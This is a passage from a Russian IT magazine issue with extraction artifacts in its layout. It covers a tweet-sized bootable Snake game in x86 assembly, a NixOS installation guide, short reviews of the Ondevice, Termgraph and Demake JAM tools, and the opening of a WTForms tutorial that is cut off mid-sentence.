                                                                                       языка Hack, человек,к такому кусочку кода (nibbles.asm) и прев‐                                                                                      ответственный за букву «s» в
                                                                                                     https перед адресом Face‐ратить его в загрузочный образ дискеты,                                                                                            book. Организатор CTF.
который бы умещался  в  твит,  то  есть
в 140 символов.





Вот как выглядит результат.


$ perl ‐E"say'swFoAKAHvqB9uBMAzRC/wPi5gAjzqqqBxz4Bc/jkYDxIchE8UHcNN
5hISHIFLAJrwLCJwwHetIa2780VtEUmMCR72uv','B'x589,'Vao='"|base64 ‐D>
boot.img

В некоторых системах (например, Linux) ключ ‐D пишется в нижнем регистре
(base64 ‐d).


             INFO

                      Это адап тированный перевод двух статей Алока
                   Менхраджани: Bootloader + retro game in a tweet
                      и Bootable CD + retro game in a tweet. Пуб лику‐
                        ется с разрешения автора. Перевел Андрей Пись‐
                     менный.



ОБРАЗ ЗАГРУЗОЧНОЙ ДИСКЕТЫ СО «ЗМЕЙКОЙ»
Технически мой код — это не бут лоадер. Настоящий бутлоадер переводит
машину с x86 в защищенный режим, загружа ет данные с дис ка (BIOS заг‐
ружает только первые 512 байт) и так далее. Я пропустил все это и вместо
этого задаю некоторые регистры и пры гаю прямо в игру.


hugi.de
Один из популярных сайтов, где про ходили эти соревнования, назывался
Hugi, и игра Nibbles, которую Altair и ODDS entertainment умес тили в 48 байт,
была одним из моих любимых творений. Эта игра также широко извес тна
как Tron и «Змейка».
  К сожалению, старый код оказалось не так‐то просто зас тавить работать.
Нужен DOS, и если работать с эмулятором, то при ходится гадать, какое
железо могло тогда быть у разработ чиков и на какой частоте оно работало.
  Поэтому я решил взять код Altair и превратить его в загрузочную дискету.
Заодно сделал несколь ко изменений, чтобы можно было нормально играть.


floppy.asm
Итак, давай разберем код.
  Для запуска кода нужно сна чала скомпилировать его:


nasm floppy.asm ‐o floppy.img

а затем запустить в QEMU, если у тебя по каким‐то причинам нет возможнос‐
ти записать на настоящую дискету:


qemu‐system‐i386 ‐fda floppy.img

Код начинается с прагмы, которая сообщает процессору, что нужно перейти
в шестнадцатиразрядный режим (в нем машина x86 изначально находится
при загрузке с флоппи).


[bits 16]

Еще одна прагма сооб щает ассемблеру, где находится код, который нужно
загрузить.


[org 0x7C00]

Задаем начальную позицию для нашей змейки.


mov bl, 1

Загружаем адрес VRAM в регистр ES.


push 0xa000
pop es

Теперь задаем позицию змейки в центре экрана и переключаем виде орежим.
Режим 13h — это VGA (1 байт на пиксель, тогда как настоящий цвет хранится
в палитре), общий размер 320 на 200. При рес тарте сразу же очищаем экран.


restart_game:
    mov       si, 320*100+160
    mov       ax, 0x0013
    int       0x10

Рисуем границы. Предполага ем, что палитра по умолчанию нас устроит. Так‐
же предполагаем, что если мы начнем сни зу и закрасим 2176 пикселей, то
получатся границы снизу и сверху.


    mov       di, 320*199
    mov       cx, 2176
    rep
draw_loop:
    stosb
    stosb
    add       di, 318
    jnc       draw_loop

Обрати внимание на переход в середине инструкции rep stosb.
  В основном цик ле мы читаем ввод с клавиату ры на порте 0x60. Сюда же
попадает ввод мыши, но нам нужно обра батывать только «вверх» (0x48), «вле‐
во» (0x4b), «вправо» (0x4d) и «вниз» (0x50).


game_loop:
    in        al, 0x60
    cmp       al, 0x48
    jb        kb_handle_end
    cmp       al, 0x50
    ja        kb_handle_end

В конце регистр BX будет содержать сдвиг позиции (+1, ‐1, +320, ‐320)
в зависимости от нажатой/отпущенной клавиши на клавиатуре. Я уверен, что
тут можно срезать пару байтов, учитывая, что мы выше уже проверяли края.


    aaa
    cbw
    dec       ax
    dec       ax
    jc        kb_handle
    sub       al, 2
    imul      ax, ax, byte ‐0x50
kb_handle:
    mov       bx, ax
kb_handle_end:
    add       si, bx

Изначально  тут  использовалась  команда,  которая  задавала  палитру
(10h/0bh), чтобы подождать вертикальной перерисовки. Теперь компьютеры
слишком быстры, так что мы вместо этого исполь зуем 15h 86h. Это заод но
сэкономит нам пару байтов.
  Обрати внимание: тебе понадобится твикнуть cx+dx, чтобы запус кать этот
код в виртуальной машине, а не на реальном железе. Практика показывает,
что виртуалки ждут в три‐четыре раза дольше, чем реальное железо.


mov       ah, 0x86
mov       dh, 0xef
int       0x15

Рисуем червя и проверяем достижение коллизий (четное равенство означает
коллизию).


mov ah, 0x45
xor [es:si], ah

Возвращаемся в основной цикл.


jpo       game_loop

Мы столкнулись со стеной или с хвостом. Начинаем заново.


jmp       restart_game

Забиваем остаток сектора нулями. Значение 0xaa55 — это подпись в конце
загрузчика.


TIMES 510 ‐ ($ ‐ $$) db 0
dw 0xaa55

Код в твите создает загрузочный файл boot.img. Можно загрузить его в QEMU
или VirtualBox и играть в игру стрелочками. Или можно записать все это на
дискету и загрузиться с нее по‐нас тоящему.





        WWW

                    •Соревнование на ассемблерную оптимиза цию
                         в рамках Hugi
                    •Исходники Altair
                      •Загрузчик с Hello World
                    •Вики OSKit



ОБРАЗ ЗАГРУЗОЧНОГО КОМПАКТ-ДИСКА
С тех пор как я сделал загрузочный флоппи, в «Твиттере» расширили лимит
длины вдвое, так что я решил сделать своими руками образ загрузочного
компакт‐диска. На нем будет работать улучшенная версия нашей «Змейки».


perl ‐E 'say"A"x46422,"BDRDAwMQFFTCBUT1JJVE8gU1BFQ0lGSUNBVElPTg",
"A"x54,"Ew","A"x2634,"/0NEMDAxAQ","A"x2721,"BAAAAYQ","A"x30,"SVVVqo
gAAAAAAAEAF","A"x2676,"LMBaACgB76gfbgTAM0Qv8D4uYAI86qqgcc+AXP45G
A8SHIRPFB3DTeYSEhyBSwCa8CwicMB3rSGtu/NFbRFJjAke9rrwQ","A"x2638'
|base64 ‐D>cd.iso

Этот код создает образ загрузочного компакт‐дис ка cd.iso. Как и образ дис‐
кеты, его можно отправлять в QEMU или VirtualBox, загружаться и играть.
   Чтобы вручную сделать образ CD, сна чала нуж но разобраться со стан‐
дартом ISO 9660. К сожалению, дос туп к стандартам ISO недешев, но,
по счастью, этот сущес тву ет в варианте ECMA 119, где и можно бесплатно
позаимствовать все спецификации.
   У ISO 9660 много всяких дополнений, например UDF, El Torito, RockRidge,
Joliet и так далее. В случае с загрузочными образами нас инте ресует только
El Torito. Однако его спецификация, на мой взгляд, одна из самых плохо
написанных. В ней есть ошибки (смотри, например, последнюю строчку
на рисунке 7), легко забыть, что все зна чения — шестнадцатеричные (нет
префиксов 0x), картинки стоят в неочевидном порядке и так далее. Одно
хорошо — документ короткий.
   Чтобы  создать  загрузочный  диск,  нам  понадобится  сначала  сде‐
лать 17 пустых секторов, за которыми будет идти набор дескрипторов тома
(Volume Descriptor Set). Сектор составляет 2048 байт.
  Обрати внимание: по спецификации ISO 9660 дескрипторы тома дол жны
начинаться с сек тора 16. А вот по El Torito загрузочная запись дол жна про‐
живать в секторе 17. Технически это значит, что нужно помес тить в шестнад‐
цатом секторе пустой дес криптор тома в качестве заг лушки, но все вроде бы
работает и без это го.
   Итак, пишем дескриптор тома.


0x00                      // Тип (0 означает загрузочную запись)
'CD001'                   // Идентификатор
0x01                      // Версия
'EL TORITO SPECIFICATION' // Идентификатор загрузочной системы
9 x 0x00                  // Отступ
32 x 0x00                 // Не используется
0x13 0x00 0x00 0x00       // Адрес каталога загрузки в абсолютных
секторах
1973 x 0x00               // Не используется

Следующий сектор — это терминатор набора дескрипторов тома (Volume De‐
scriptor Set Terminator).


0xff                      // Тип (255 — терминатор)
'CD001'                   // Идентификатор
0x01                      // Версия
2041 x 0x00               // Не используется

За дескрипторами томов следует загрузочный каталог (Boot Catalog). El Torito
поддерживает разные режимы эмуляции. Компакт‐диск может эмулировать
загрузочный флоппи, загрузочный жесткий диск и так далее. Я выбрал вари‐
ант без эмуляции — в этом случае подразумевается, что BIOS загрузит опре‐
деленное число секторов и передаст управление нашему бутлоадеру.
   Контрольная сумма вычисляется таким обра зом, чтобы все шес тнад‐
цатибитные значения в записи давали в сумме ноль (mod 65536).
   Вот первая запись в загрузочном каталоге (Validation Entry).


0x01                      // Идентификатор заголовка
0x00                      // Идентификатор платформы (0 — Intel x86)
0x00 0x00                 // Зарезервировано
'a'                       // Строка‐идентификатор
23 x 0x00                 // Отступ
cksum cksum               // Контрольная сумма (2 байта)
0x55 0xaa                 // Байты ключей

Вторая запись (Default Entry):


x88                       // Индикатор загрузчика (0x88 —
загрузочный)
0x00                      // Тип носителя (0 — без эмуляции)
0x00 0x00                 // Загрузочный сегмент
0x00                      // Тип системы
0x00                      // Не используется
0x01 0x00                 // Число секторов для считывания
0x14 0x00 0x00 0x00       // Адрес виртуального диска (в абсолютных
секторах)
20 x 0x00                 // Не используется

Дальше идут нули до кон ца сектора.


1984 x 0x00               // Не используется

Дальше идет бутлоадер игры, ниже — он целиком. Никаких отличий от флоп‐
пи‐версии здесь нет.


          [bits 16]
          [org 0x7C00]
          mov bl, 1
          push 0xa000
          pop es
restart_game:
          mov       si, 320*100+160
          mov       ax, 0x0013
          int       0x10
          mov       di, 320*199
          mov       cx, 2176
          rep
draw_loop:
          stosb
          stosb
          add       di, 318
          jnc       draw_loop
game_loop:
          in        al, 0x60
          cmp       al, 0x48
          jb        kb_handle_end
          cmp       al, 0x50
          ja        kb_handle_end
          aaa
          cbw
          dec       ax
          dec       ax
          jc        kb_handle
          sub       al, 2
          imul      ax, ax, byte ‐0x50
kb_handle:
          mov       bx, ax
kb_handle_end:
          add       si, bx
          mov       ah, 0x86
          mov       dh, 0xef
          int       0x15
          mov ah, 0x45
          xor [es:si], ah
          jpo       game_loop
          jmp       restart_game
TIMES 2048 ‐ ($ ‐ $$) db 0

Дальше мне оставалось только написать скрипт для компиляции загрузчика,
сборки образа и создания текста твита. Закончив со всем этим, я прожег
результат на болванку и потестировал на реальном железе.
 ТРЮКИ
 ПРАВИЛЬНЫЙ
     LINUX





         ПРОБУЕМ NIXOS, УНИКАЛЬНЫЙ,
   Валерия Губарева   СТРАННЫЙ И ОЧЕНЬ УДОБНЫЙ
 В данный момент работает
аналитиком в компании "Digi‐          ДИСТРИБУТИВ    tal Security" (@DSecRU)
 veneramuholovka@yandex.ru



  Сколько раз в жизни ты переуста навливал Linux? А сколько
  раз устанав ливал одинако вый набор пакетов на несколько
  разных машин? И не приходилось ли тебе начинать все сна‐
  чала из‐за неудачного обновления системы или конфигов?
  Все это не только утомляет, но и гро зит серьезными потеря‐
  ми, если речь идет о бизнесе. Избежать таких проб лем
  поможет NixOS — дистрибутив, который можно в одну
  команду привести к нужному тебе состоянию.


  ДЕКЛАРАТИВНЫЙ И ФУНКЦИОНАЛЬНЫЙ
  NixOS — это дистрибутив Linux, пос троенный вокруг двух ключевых идей:
    1. Декларативное описание конфигура ции (или, лучше сказать, состояния)
     системы.
    2. Функциональный менеджер пакетов, допускающий откаты и парал лельную
      установку приложений.

  В отличие от других дистрибутивов NixOS не требует от пользователя выпол‐
   нять длинную цепоч ку действий, чтобы получить сис тему, которая ему нужна:
   устанавливать систему, загрузчик и пакеты, добавлять пользователей, пра‐
   вить конфиги и так далее.
    Вместо этого NixOS предлагает опи сать необходимое состояние системы
   в специальном конфигурационном файле, где будет перечислено  все,
  начиная от пакетов и заканчивая возможностью логина по SSH с помощью
   пароля. Далее достаточ но выполнить одну команду, и, в каком бы состоянии
  система ни находилась в данный момент, пакетный менеджер приведет ее
   к требуемому.
     Другими словами, если тебе нужна система с установленным Apache, PHP,
  MySQL, SSH и с некоторыми дополнительными настройками, ты просто опи‐
  сываешь все это в одном конфиге, а затем отда ешь команду на разверты‐
  вание системы. Независимо от того, свежеустановленная это ОС или уже
  используемая, ты получишь абсо лютно идентичную систему с идентичным
  набором пакетов и конфигов.
     Все это возможно бла годаря пакет ному менеджеру Nix. В классических
  дистрибутивах Linux пакетный менеджер при уста новке пакета «раз мазывает»
  его содержимое по всей системе: запус каемые файлы в /usr/bin, биб лиоте‐
   ки в /usr/lib, остальные компонен ты — в /usr/share. В результате ты
  получаешь проблемы с неудачным обновлением/удалением пакетов (когда
   могут остаться файлы‐сироты), ад зависимос тей (ког да два приложения тре‐
  буют разные версии /usr/lib/libjpeg.so, например) и легкий способ унич‐
  тожить всю систему, неудачно обновившись.
    Пакетный менеджер Nix размещает все уста новленные пакеты в собс твен‐
  ных подкаталогах внутри катало га /nix/store. К при меру, установленный
   пакет  Git будет располагаться в  каталоге /nix/store/nawl092prjblb‐
  hvv16kxxbk6j9gkgcqm‐git‐2.14.1, где набор цифр — это хеш, образован‐
  ный от окружения сборки пакета: файлов исходников, дерева зависимостей,
  флагов компилятора и другого. Поэто му с помощью Nix можно установить
  одновременно не только две версии одного приложения, но и даже две раз‐
  ные сборки.
     Благодаря возможнос ти уста навливать разные версии и сборки пакетов
  и тому, что они располагаются отдельно от системных каталогов, NixOS
  решает почти все проб лемы клас сических пакетных менеджеров — от некон‐
  систентности системы после неудачного обновления до ада зависимостей.
  Этот же механизм позволяет откатить систему к предыду щему сос тоянию
  и создать сразу несколько разных профилей (слепков) системы, перек‐
  лючаться между которы ми можно, не перезагружая машину. Хочешь прев‐
   ратить домашний комп в сервер одной командой? В NixOS с этим нет проб‐
   лем. Ты даже можешь унес ти конфигура ционный файл NixOS на другую
  машину и развернуть на ней точно такую же систему с абсолютно тем же
  набором пакетов.
     NixOS позволяет устанавливать софт не только root, но и обычным поль‐
  зователям (в этом случае пакет будет уста новлен в домашний каталог), а так‐
  же имеет встроенный сборщик мусора, который автоматически удалит все
  пакеты‐зависимости, если они больше никому не нуж ны.


  УСТАНАВЛИВАЕМ
  В NixOS нет инсталлятора, но если ты когда‐нибудь устанавливал Arch Linux,
   то у тебя не должно возникнуть проблем. Для начала скачиваем пос леднюю
  версию NixOS с официального сайта и записы ваем ее на флешку:


  $ wget https://d3g5gsiof5omrk.cloudfront.net/nixos/18.03/nixos‐18.03.
  133192.45f52f765cd/nixos‐graphical‐18.03.133192.45f52f
  765cd‐x86_64‐linux.iso
  $ sudo dd if=nixos‐graphical‐18.03.133192.45f52f765cd‐x86_64‐linux.
  iso of=/dev/sdX

  Затем перезагружаем машину и грузимся с флешки. NixOS встретит тебя
  приветствием командной строки.
    Первое, что мы дол жны сделать, — подготовить диск для установки. Про‐
  ще всего сделать это с помощью parted (в данном примере мы соз даем один
  большой раздел ext3 на диске с разметкой в сти ле DOS):


  $ parted /dev/sda
  (parted) mklabel msdos
  (parted) mkpart primary ext4 0% 100%
  (parted) quit

  Мы будем ставить систему на зашифрованный диск, поэтому для начала ини‐
  циализируем шифрование:


  $ export NIXOS_NAME="name" # Придумай свое имя
  $ cryptsetup luksFormat /dev/sda1
  $ cryptsetup luksOpen /dev/sda1  ${NIXOS_NAME}

  Затем примонтируем диск к каталогу /mnt:


  $ mkfs.ext4 ‐L ${NIXOS_NAME} /dev/mapper/${NIXOS_NAME}
  $ mount /dev/mapper/${NIXOS_NAME} /mnt

  Теперь обновляем репозитории:


  $ nix‐channel ‐‐update

  И генерируем дефол товые файлы конфигурации:


  $ nixos‐generate‐config ‐‐root /mnt

  Команда сохранит на диск два файла: configuration.nix и hardware‐con‐
  figuration.nix. Первый — это и есть тот самый файл описания состояния
  системы, с которым мы будем работать в дальнейшем. Содержимое второго
  изменять не надо — оно создается автоматически на основании железа,
  на которое устанавливается NixOS.
    Наконец, устанавлива ем систему и перезагружа емся:


  $ nixos‐install





                          Ус танавливаем NixOS


  CONFIGURATION.NIX
  Файл configuration.nix — основа дистрибутива. В нем пользователь ука‐
  зывает всю желаемую/необходимую конфигура цию (состояние) системы
   от пользовате лей и пакетов до шрифтов и в любой момент может ее изме‐
   нять. Система будет выглядеть ровно так, как ее опишет пользователь в этом
  файле.
     Конечно, можно не заморачивать ся и найти уже готовый конфиг на том же
   Гитхабе и взять его «попользоваться». Но это не имеет особого смысла,
  потому что рано или поздно придется во всем раз бираться самому, да и
  попасться тебе может какое‐нибудь непотребство, а не конфиг.
     Чтобы изменения кон фигура ции вступили в силу, необходимо выполнить
  команду


  $ nixos‐rebuild switch

  и перезагрузиться.
    Перед этим работоспособность конфига можно проверить командой


  $ nixos‐rebuild test





                        Правим конфиг NixOS


  Вы бираем загрузчик
  Выбери жизнь, выбери семью, выбери загрузчик.
     Если ты установил систему на диск с разметкой DOS (как было описано
   в статье), то в configuration.nix необ ходимо добавить следующие строки:


  # Включаем GRUB
  boot.loader.grub.enable = true;
  # Нам нужен GRUB 2
  boot.loader.grub.version = 2;
  # Загрузчик должен быть установлен на /dev/sda
  boot.loader.grub.device = "/dev/sda";
  # Включаем поддержку зашифрованных дисков
  boot.loader.grub.enableCryptodisk = true;

  Для UEFI‐систем достаточно двух строчек:


  boot.loader.systemd‐boot.enable = true;
  # Разрешить EFI вносить изменения
  boot.loader.efi.canTouchEfiVariables = true;


  Имя машины и часовой пояс
  Здесь все совсем просто:


  networking.hostName = "mymachine";
  time.timeZone = "Europe/Moscow";

  Заодно сразу активируем NetworkManager:


  networking.networkmanager.enable = true;


  Соз даем пользовате лей
  Добавим пользователя vasya:


  users.users.vasya = {
      isNormalUser = true;
      # Дополнительная информация
      description = "Userov User";
      # Группы, в которые входит пользователь
      extraGroups = [ "networkmanager" ];
  };

  По умолчанию у пользователя не будет пароля, поэтому сразу после логина
  под его именем стоит запустить команду passwd и указать пароль.


  Ставим пакеты
  Повседневно используемые прог раммы вроде htop, Thunderbird и Vim уста‐
  навливаются без особых заморочек. Перечисляешь то, что хочешь поставить,
  сохраняешь, делаешь nixos‐rebuil switch и поль зуешься:


  environment.systemPackages = with pkgs; [
      htop
      thunderbird
      vim
  ]

  Эти же пакеты можно устанавливать не только записы вая их названия в кон‐
  фигурационный файл, но и командой


  $ nix‐env ‐iA "package_name"

  Команду можно выполнять с пра вами root и без. В первом случае пакет будет
   установлен общесистемно и станет доступным всем пользователям, во вто‐
  ром — только установившему пользователю. В любом случае все пакеты
   устанавливаются в /nix/store, поэтому, если два пользователя поочередно
   установят один и тот же пакет, он будет ска чан толь ко один раз, а пользовате‐
  ли получат доступ к нему через символические ссылки.
    Символические  ссылки  не  переза писываются  при  переустановке/
  обновлении пакета. Поэто му пользователи могут ставить разные версии
  одних и тех же пакетов без «пересечений».
    С названиями пакетов могут быть сложности, поэтому лучше проверять
  правильность их написа ния тут.





                        Хранилище пакетов NixOS


  Ставим проприетарные пакеты
  С проприетарными пакетами в NixOS не все так просто. Можно разрешить
   ставить любые проприетарные пакеты командой export NIXPKGS_ALLOW_UN‐
  FREE=1, но лучше будет разрешать ставить только нужные, а все остальные
   будут под запретом. Например, так:


  {
      allowUnfreePredicate = (pkg: elem (builtins.parseDrvName pkg.name
  ).name [ "package_name_1" "package_name_2" ]);
  }


  GUI
   NixOS, как и любой дру гой дистрибутив, поз воляет выбирать GUI. Для этого
  понадобится примерно такая конструкция:


  services.xserver = {
      # Включаем иксы
      enable = true;
      # Выбираем окружение рабочего стола
      desktopManager.gnome3.enable = true;
      # и/или менеджер окон
      windowManager.i3.enable = true;
  };


  Дру гие настройки
  NixOS поддерживает огромное количес тво нас троек, которые можно указать
   в conﬁguration.nix. Узнать о них можно с помощью команды nixos‐option:


  $ nixos‐option
  This attribute set contains:
  assertions
  boot
  containers
  ec2
  environment
  fileSystems
  fonts
  gnu
  gtkPlugins
  hardware
  ...

  Но это только разделы нас троек, можно копнуть и глубже:


  $ nixos‐option services
  This attribute set contains:
  accounts‐daemon
  acpid
  activemq
  ...

  И еще глубже:


  $ nixos‐option services.openssh
  This attribute set contains:
  allowSFTP
  authorizedKeysFiles
  challengeResponseAuthentication
  enable
  extraConfig

   Также можно использовать онлайн‐поисковик по опциям.





                   NixOS и опции управления сервисами


  Откаты
   Так же как и пакеты, конфигура ции не перезаписываются, вместо этого соз‐
  даются новые для возможности переключаться между ними и безболезненно
   откатывать состояние. Все версии файла, которые были примене ны коман‐
  дой nixos‐rebuild, хра нят ся в GRUB, и при загрузке можно будет выбрать
  не дефолтную = последнюю версию, а нужную и потом уже сделать ее заг‐
  ружаемой по умол чанию.





                      Конфигура ции NixOS в GRUB

  Посмотреть список доступных конфигураций поз воляет команда


  $ ls ‐l /nix/var/nix/profiles/system‐*‐link

  Можно и без перезагрузки отка титься к предыдущему конфигу командой


  $ nixos‐rebuild switch ‐‐rollback

  или к еще более раннему командой


  $ /nix/var/nix/profiles/system‐N‐link/bin/switch‐to‐configuration
  switch

   где N — это номер вер сии конфига. Чтобы этот конфиг загружал ся по умол‐
  чанию, нужна команда


  $ /run/current‐system/bin/switch‐to‐configuration boot


  Об новле ния
  NixOS можно обновлять через каналы. Канал — это нечто вроде репозитория
   пакетов. И так же, как репозитории, они могут быть стабильные и нестабиль‐
  ные (для смелых). Сущес твуют и small‐каналы — своего рода серверные
  редакции репозиториев с быс трыми security‐обновлениями и небольшим
  количеством исклю чительно серверного софта для платформы x86_64. Пос‐
  мотреть доступные каналы можно по ссылке.
     Для переключения на канал дос таточно двух команд:


  $ nix‐channel ‐‐add ссылка
  $ nixos‐rebuild switch ‐‐upgrade

  Обновления можно получать автоматически по расписанию. Для этого дос‐
   таточно добавить в конфиг строку


  system.autoUpgrade.enable = true;

  Чтобы обновления пакетов соответс твовали версии сис темы, также необ‐
  ходима строка


  system.stateVersion = "18.03";

   где 18.03 — версия системы.


  ВЫВОДЫ
  При всей своей необычности NixOS весь ма дружелюбен: не мешает поль‐
  зователю работать, не соз дает горы хлама в системе и знает, что такое
  безопасность. К любым странностям со временем привыкаешь, и исполь‐
   зовать NixOS повседневно на дес ктопе может оказать ся очень удобно.
ТРЮКИ





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



      ONDEVICE — СЕРВИС, КОТОРЫЙ ДАЕТ ПРОСТОЙ ДОСТУП
      К МАШИНАМ ВО ВНУТРЕННЕЙ СЕТИ
       Необходимость получить доступ к машине, которая не имеет адре са1        в глобальной сети, воз ника ет далеко не только при взломе. Часто
        нужно достучаться до сво их же устройств, которые находятся за NAT,
        а доступ к настройкам маршру тиза тора есть не всегда. В этом слу‐
        чае можно вос поль зоваться сторонним сервисом, который помога‐
         ет наладить контакт.





        Ondevice — это как раз такой сервис. Он служит надстройкой
        над SSH, rsync, SCP или SFTP и обес печивает безопас ный доступ
         (если ты доверя ешь стороннему сервису) к локальным машинам
         откуда  угодно.  Для   туннелирования  трафика  используется
         веб‐сокет, так что если на устройстве работа ет HTTPS, то этого дос‐
         таточно.
          Если такой вариант тебе подойдет, то первым делом регистри‐
        руйся и создавай ключ авторизации (или несколько — с разными
       ролями и правами), а затем ставь ПО — как на устройства,
          к которым ты собираешь ся подключать ся, так и на рабочий компь‐
        ютер.





                           Соз дание ключа

       Сейчас поддерживаются Linux и macOS, также есть вари ант в виде
        контейнера Docker. Нативной поддержки Windows пока нет, так что
        разработчики рекомендуют использовать WSL.
         На устрой ствах, к которым ты собира ешься получить доступ, нуж‐
        но сначала выполнить вход (ondevice login), затем поднять демон
             (ondevice daemon). Теперь логинься на рабочей машине и пиши
        ondevice list, чтобы увидеть свои устрой ства. Для подключения
          к  ним  по SSH  служит  команда  on  ssh  логин@название‐
        устройства.
          Бесплатно можно подключить до пяти девайсов и прогонять
        не более пяти гигабай тов трафика в месяц, чего более чем дос‐
         таточно для личного использования.


      TERMGRAPH — КОНСОЛЬНАЯ УТИЛИТА ДЛЯ РИСОВАНИЯ
      ГРАФИКОВ
        Если ты хочешь стать нас тоящим мастером командной строки Unix,2         то не торопись выделять данные, выведенные какой‐нибудь кон‐
        сольной командой, и отправлять их в Excel или OpenOﬃce Calc
        для прев ращения в диаграммы. Ведь есть способ сделать это,
        не покидая терминал!





        Termgraph — это нес ложная утилита, написанная на Python, которая
        принимает на вход файлы с данными, разделенными символом
        табуляции, а на выходе рису ет гистограммы из символов псевдогра‐
       фики (или, например, из эмодзи, если ты этого пожелаешь). Можно
        выбирать из горизонтальной или вертикальной ориентации, наз‐
         начать цвета, рисовать разделен ные столбики (stacked  charts),
        а также создавать календари с тепловыми картами по дням.
          Для работы Termgraph понадо бится Python 3 и библиотека col‐
        orama. Пользоваться предельно прос то:  запускаешь  termgraph
        и передаешь либо название фай ла с данными, либо сами данные
        в стандартный ввод. Цвета назначаются при помощи параметра col‐
            or, например termgraph  data/ex4.dat  ‐‐color  {blue,red}.
        Кстати, как формировать данные, можешь пос мотреть в примерах
        из папки data.


      DEMAKE JAM — КОНКУРС МИНИАТЮРНЫХ ВЕРСИЙ
      ЗНАМЕНИТЫХ ИГР
        25 августа 2018 года на платформе itch.io завершился замечатель‐3       ный конкурс для разработ чиков игр: он назывался Demake JAM
        и был посвящен раз работке «демейков» — упрощенных клонов
        известных игр. Как это выглядит, ты можешь посмотреть на странице
        с результатами, а на страницах игр ты в большинс тве случаев обна‐
       ружишь браузерную версию, в которую можно тут же и поиграть.





       К примеру, занявшая первое мес то игра Metro Cop — это демейк
        популярного в свое время виртуального тира Virtua Cop, Bio Evil 4
         (второе место) — это, как ты можешь догадаться, двумерный плат‐
       формер по мотивам Resident Evil 4, Low Mem Sky — плоская версия
       No Man’s Sky, разработанная на PICO‐8. У этой ретроконсоли (о
        которой мы  подробно  писали  в  мартовском  номере)  все‐
         го 32 килобайта памяти, так что Low Mem — это не прос то шутка.
         Собственно, на PICO‐8 создана немалая часть игр, присланных
        на Demake JAM. Среди них, к примеру, Low Knight (демейк Hollow
          Knight), Delunky (демейк Spelunky), Picoman Go (Hitman Go) и многие
        другие. Из того, что мне приглянулось, хочу обратить твое внимание
        на Pico Space Program — аналог Kerbal Space Program, который
        работает на PICO‐8 и пос тавляется с ис ходными кодами.
КОДИНГ





                                                              Илья Русанен
                                                                     Главный редактор ][,
                                                                занимаюсь разработкой и
                                                                        безопасностью
                                                                              rusanen@glc.ru

    ИДЕАЛЬНАЯ
      ФОРМА
      ОБРАБАТЫВАЕМ СЛОЖНЫЕ ФОРМЫ
      НА PYTHON С ПОМОЩЬЮ WTFORMS





Обработка HTML‐форм в веб‐приложениях — несложная
задача. Казалось бы, о чем говорить: наб росал форму
в шаблоне, создал обработчики на сервере, и готово. Проб‐
лемы начинаются, когда форма разраста ется: нужно следить
за полями, их ID, атрибута ми name, корректно маппить атри‐
буты на бэкенде при генерации и процессинге дан ных.
А если часть фор мы нужно еще и переиспользовать, то раз‐
работка прев раща ется в постоян ную рутину: приходится
бесконечно копировать атрибуты тегов с клиента на сервер
и копипастить однотип ный код. Однако есть способы сде‐
лать работу с формами удобной.


ЗАЧЕМ ЭТО НУЖНО?
Чтобы понять, какую проблему мы решаем, давай взглянем на простой при‐
мер. Представь, что в нашем веб‐при ложении есть форма для создания
пользователей.


<form action="">
    <!‐‐ personal info ‐‐>
    <input type="text" id="f_name" name="f_name" placeholder="John" />
    <input type="text" id="l_name" name="l_name" placeholder="Dow" />
    <!‐‐ account info ‐‐>
    <input type="email" id="email" name="email" placeholder="john@example.
com" />
    <input type="password" id="password" name="password" placeholder=
"**********" />
    <!‐‐ meta info ‐‐>
    <select name="gender" id="gender">
        <option value="0">Male</option>
        <option value="1" selected>Female</option>
    </select>
    <input type="city" id="city" name="city" placeholder="Saint‐Petersburg" /
>
    <textarea name="signature" id="signature" cols="30" rows="10"></textarea>
    <input type="submit" value="Create user!" />
</form>

Эта форма выглядит прос то. Одна ко использование в реальном приложении
добавит ряд задач.
 1. У каждого поля (или в одном блоке) нужно вывести информацию об ошиб‐
   ках, которые могут появиться при валида ции формы.
 2. Скорее всего, для некото рых полей мы захотим иметь подсказки.
 3. Наверняка нам нужно будет повесить по одному или нес колько CSS‐клас‐
   сов на каждое поле или даже делать это динамически.
 4. Часть полей дол жна содержать предзапол ненные данные с бэкенда —
   предыдущие попытки сабмита формы или данные для выпадающих спис‐
   ков. Частный случай с полем gender прост, однако опции для селекта
   могут формироваться запросами к БД.

И так далее. Все эти доделки раздуют нашу форму как минимум вдвое.
  А теперь посмотрим на то, как мы будем обрабаты вать эту форму на сер‐
вере. Для каждого поля мы должны сделать следующее.
 1. Корректно смаппить его по name.
 2. Проверить диапазон допустимых значений — валидировать форму.
 3. Если были ошибки, сохранить их, вернув форму для редактирования назад
   на клиентскую часть.
 4. Если все ОK, то смаппить их на объект БД или ана логичную по свойствам
   структуру для дальнейшего процессинга.

Вдобавок при создании пользователя тебе как админу нужно запол нять толь‐
ко часть дан ных (email и password), остальное поль зователь запол нит сам
в про филе. В этом случае тебе, скорее всего, придется скопировать шаблон,
удалив часть полей, создать идентичный обра ботчик формы на сервере
или вставлять проверки в текущий для различных вари антов формы. Логику
валидации полей придется или копировать, или выносить в отдельную фун‐
кцию. При этом нужно не запутать ся в названиях полей, приходящих с кли‐
ента, иначе данные прос то потеря ются.
  Но пользователей нужно не только создавать, но и редактировать, исполь‐
зуя ту же самую форму! Причем у админа и юзера эти формы будут раз ные,
с частично пересекающимся набором полей.
  Все эти требования резко увеличивают количество шаб лонов, обработ‐
чиков, валидаторов, которые в лучшем случае будут вынесе ны в общий
модуль, а скорее всего, будут копипаститься по‐быстрому. И при необ‐
ходимости изменить одно поле в форме придет ся перелопатить все при‐
ложение, отлавливая ошиб ки и опечатки.
  Было бы удобнее описать форму в каком‐то декларативном формате, нап‐
ример в виде Python‐класса, одноразово описав все параметры, классы,
валидаторы, обработчики, а заодно предусмотрев воз можнос ти ее нас‐
ледования и расширения. Вот тут‐то нам и поможет биб лиотека WTForms.


             INFO

                      Если ты использовал круп ные фреймворки типа
                       Django или Rails, ты уже сталкивался со схожей
                     функциональностью в том или ином виде. Однако
                      не для каждой задачи требует ся огромный Djan‐
                         go. Применять WTForms удобно в паре с лег‐
                        ковесными микрофреймворками или в узкоспе‐
                      циализирован ных   приложениях    с    необ‐
                      ходимостью  обрабаты вать  веб‐формы,   где
                       использование Django неоп равдан но.



УСТАНОВКА
Для  начала  установим саму библиотеку. Я  буду показывать примеры
на Python 3. Там, где нужен контекст, код исполняется в обработчике фрей‐
